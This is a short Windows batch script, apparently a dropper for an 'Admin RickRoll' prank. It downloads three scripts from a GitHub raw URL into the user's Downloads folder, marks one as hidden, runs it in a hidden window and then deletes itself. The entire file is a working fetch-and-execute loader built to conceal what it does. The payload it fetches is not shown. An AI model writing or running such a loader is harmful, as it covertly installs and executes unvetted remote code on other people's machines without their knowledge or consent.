@echo on
cd C:%homepath%\Downloads
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Test.bat' -OutFile .\Test.bat
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Mouse.ps1' -OutFile .\Mouse.ps1
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Mouse.bat' -OutFile .\Mouse.bat
attrib +h Test.bat
powershell start .\Test.bat -windowstyle hidden
cd /D "%~dp0"
del Big.bat
exit
